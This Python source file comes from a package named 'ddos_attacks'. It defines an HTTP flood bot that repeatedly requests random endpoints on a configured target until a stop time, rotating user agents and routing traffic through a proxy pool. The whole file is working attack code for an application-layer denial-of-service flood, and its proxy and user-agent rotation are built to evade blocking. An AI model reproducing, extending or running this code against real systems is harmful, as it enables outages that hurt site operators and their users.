import time, asyncio, random
from pathlib import Path
from ddos_attacks.utils import load_json
from ddos_attacks.proxy.proxy import ProxyPool

ddos_config = load_json(Path(__file__).resolve().parents[2] / "config/l7ddos.json")
TARGET = ddos_config["l7"]["TARGET"]
ENDPOINTS = ddos_config["l7"]["ENDPOINTS"]
USER_AGENTS = ddos_config["l7"]["USER_AGENTS"]


class L7Bot:
    def __init__(self, num: int):
        self.target = TARGET
        self.endpoints = ENDPOINTS
        self.user_agents = USER_AGENTS
        self.name = f"bot{num}"
        self.text = None

    async def job(self, session, limiter, stats, stop_time, pool: ProxyPool | None):
        while time.time() < stop_time:
            if pool:
                p = await pool.acquire(timeout=1.0)
                if p is None:
                    await asyncio.sleep(0.1)
                    continue
                proxy_url = p.url

            await limiter.acquire()
            endpoint = random.choice(self.endpoints)
            headers = {"User-Agent": random.choice(self.user_agents)}
            start = time.time()

            if pool:
                try:
                    async with session.get(self.target + endpoint, headers=headers, proxy=proxy_url, timeout=10) as resp:
                        self.text = await resp.text()
                        response_time = (time.time() - start) * 1000.0
                        stats['response_times'].append(response_time)
                        stats['http_codes'].append(resp.status)
                        pool.report_success(p)
                except Exception as e:
                    stats['errors_count'] += 1
                    pool.report_failure(p)
                finally:
                    pool.release(p)
                await asyncio.sleep(0)

            else:
                try:
                    async with session.get(self.target + endpoint, headers=headers, timeout=10) as resp:
                        self.text = await resp.text()
                        response_time = (time.time() - start) * 1000.0
                        stats['response_times'].append(response_time)
                        stats['http_codes'].append(resp.status)
                except Exception as e:
                    stats['errors_count'] += 1
                await asyncio.sleep(0)